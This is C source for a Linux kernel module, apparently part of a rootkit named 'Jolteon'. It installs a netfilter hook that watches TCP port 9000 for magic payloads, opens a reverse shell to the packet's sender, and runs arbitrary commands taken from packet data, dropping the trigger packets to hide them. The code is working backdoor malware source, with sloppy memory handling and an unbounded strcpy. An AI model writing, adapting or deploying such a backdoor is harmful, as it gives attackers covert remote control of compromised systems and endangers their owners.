#include "../include/netfilter_manager.h"
#include "../include/utils.h"
#include "../include/config.h"
#include "../include/hookers.h"

const char* JOLTEON_BACKDOOR_KEY = "JOLTEON_PAYLOAD_GET_REVERSE_SHELL";
const char* JOLTEON_CODE_EXECUTION_KEY = "JOLTEON_EXECUTE_CMD";
#define JOLTEON_CODE_EXECUTION_KEY_BUF_LEN 512

/**
 * Inspects incoming packets and check correspondence to backdoor packet:
 *      Proto: TCP
 *      Port: 9000
 *      Payload: JOLTEON_PAYLOAD_GET_REVERSE_SHELL (or any other payload of above)
 */
unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state){
    //Network headers
    struct iphdr *ip_header;        //ip header
    struct tcphdr *tcp_header;      //tcp header
    struct icmphdr *icmp_header;    //icmp header
    struct sk_buff *sock_buff = skb;//sock buffer
    char *user_data;       //data header pointer
    //Auxiliar
    int size;                       //payload size
    char* _data;
    struct tcphdr _tcphdr;
    struct iphdr _iph;
    char ip_source[16];
    //char port[16];

    if (!sock_buff){
        return NF_ACCEPT; //socket buffer empty
    }
    
    ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);
    //ip_header = (struct iphdr *)skb_network_header(sock_buff);
    if (!ip_header){
        return NF_ACCEPT;
    }

    //Backdoor trigger: TCP
    else if(ip_header->protocol==IPPROTO_TCP){ 
        unsigned int dport;
        unsigned int sport;

        tcp_header = skb_header_pointer(skb, ip_header->ihl * 4, sizeof(_tcphdr), &_tcphdr);
        //tcp_header= (struct tcphdr*)((unsigned int*)ip_header+ ip_header->ihl);

        sport = htons((unsigned short int) tcp_header->source);
        dport = htons((unsigned short int) tcp_header->dest);
        //printk(KERN_INFO "Received packet on port %u\n", dport);
        if(dport != 9000){
            return NF_ACCEPT; //We ignore those not for port 9000
        }
        printk(KERN_INFO "Received packet on port 9000\n");
             

        //size = htons(ip_header->tot_len) - ip_header->ihl*4 - tcp_header->doff*4;
        size = htons(ip_header->tot_len) - sizeof(_iph) - tcp_header->doff*4;
        _data = kmalloc(size, GFP_KERNEL);

		if (!_data)
			return NF_ACCEPT;
        _data = kmalloc(size, GFP_KERNEL);
        user_data = skb_header_pointer(skb, ip_header->ihl*4 + tcp_header->doff*4, size, &_data);
        if(!user_data){
            printk(KERN_INFO "NULL INFO");
            kfree(_data);
            return NF_ACCEPT;
        }

        if(strlen(user_data)<10){
            return NF_ACCEPT;
        }
        
        if(memcmp(user_data, JOLTEON_BACKDOOR_KEY, strlen(JOLTEON_BACKDOOR_KEY))==0){
            char *port_str = user_data + strlen(JOLTEON_BACKDOOR_KEY);
            printk(KERN_INFO "Received backdoor packet \n");
            kfree(_data);

            snprintf(ip_source, 16, "%pI4", &ip_header->saddr);

            /* Use port from packet, fall back to default if empty */
            if (strlen(port_str) == 0)
                port_str = REVERSE_SHELL_PORT;

            printk(KERN_INFO "Shell connecting to %s:%s \n", ip_source, port_str);

            start_reverse_shell(ip_source, port_str);
            return NF_DROP;
        }else if(memcmp(user_data, JOLTEON_CODE_EXECUTION_KEY, strlen(JOLTEON_CODE_EXECUTION_KEY))==0){
            char cmd_string[JOLTEON_CODE_EXECUTION_KEY_BUF_LEN];
            strcpy(cmd_string, user_data+strlen(JOLTEON_CODE_EXECUTION_KEY));

            run_cmd(cmd_string);
            printk(KERN_INFO "Received command %s \n", cmd_string);
            return NF_DROP;

        }

        return NF_ACCEPT;

    }
    return NF_ACCEPT;

}

static struct nf_hook_ops nfho;

/**
 * Registers predefined nf_hook_ops
 */ 
int register_netfilter_hook(void){
    int err;
    
    nfho.hook = net_hook;
    nfho.pf = PF_INET;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.priority = NF_IP_PRI_FIRST;

    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
        err = nf_register_net_hook(&init_net, &nfho);
    #else
        err = nf_register_hook(&nfho);
    #endif
    if(err<0){
        //printk(KERN_INFO "JOLTEON:: Error registering nf hook");
    }else{
        //printk(KERN_INFO "JOLTEON:: Registered nethook");
    }
    
    return err;
}

/**
 * Unregisters predefined nf_hook_ops
 */ 
void unregister_netfilter_hook(void){
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
        nf_unregister_net_hook(&init_net, &nfho);
    #else
        nf_unregister_hook(&nfho);
    #endif
    //printk(KERN_INFO "JOLTEON:: Unregistered nethook");

}